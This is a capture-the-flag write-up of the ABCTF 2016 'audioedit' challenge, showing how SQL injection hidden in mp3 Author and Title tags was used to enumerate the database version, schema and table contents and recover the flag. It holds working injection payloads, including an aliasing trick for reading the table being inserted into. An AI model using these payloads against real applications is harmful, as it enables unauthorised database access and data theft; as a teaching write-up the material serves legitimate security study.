I made a cool site to edit audio files. [Can you exploit it?](http://107.170.122.6/audioedit/)

## Write-up

The site offers users to upload an mp3 and therewith do some modifications on e.g. pitch or grain size.
In order to save the uploaded file it's inserted into a database.
It can be requested with a identifier delivered as the HTTP-GET parameter 'file'.
The identifier is created as the sha1sum of the mp3 content.
When opening a mp3 that way, the edit-overview shows some modification modulators,
but also the 'Author' as well as the 'Title' of the particular mp3.

![edit.php](images/abctf-2016-audioedit-edit.png)

Some test quickly revealed the input of 'Author' and 'Title' in the mp3-metadata isn't verified
and offers a SQL-injection vulnerability.

We figured the insertion statement looked smth. like this:

    INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);

In order to do an SQL-injection we have to create a special author and title field.
I used [easyTAG](https://wiki.gnome.org/Apps/EasyTAG) but of course you can use the tool of your choice to modify mp3-meta-data;-)
In order to do an injection and maintain a valid INSERTION statement you can create an mp3
with the following meta data:


    title  = "" (leer)
    author = a', (SELECT @@version))-- -b

Which creates the following statement

    INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);

The 'a' in the beginning and the 'b' in the end were necessary because the first and last character were
discarded...

This gave us the database version: 5.5.49-0ubuntu0.14.04.1

Next we wanted to know the database name:

    author = a', (SELECT database()))-- -b:
    audioedit

And of course the column names:

    author = a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT x,1))-- -a
    with x in range(0,3):
    id
    file
    author
    title

So finally we wanted see whats in there:

    author = a',(SELECT author FROM audioedit.audioedit LIMIT 0,1))-- -a

... but this gave us an insertion error!:(

The problem is you can't select from a database that you're inserting into at the same time... Thanks to Arxenix!:)

So we got around by using AS:

    author = a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
    ABCTF
    author = a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
    flag
    author = a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
    supersecretflagf1le.mp3

Using this info we visited the corresponding site: http://107.170.122.6/audioedit/edit.php?file=supersecretflagf1le.mp3

Setting the visualization to 'Sonogram' finally showed us the flag:

    ABCTF{m3t4_inj3cti00n}
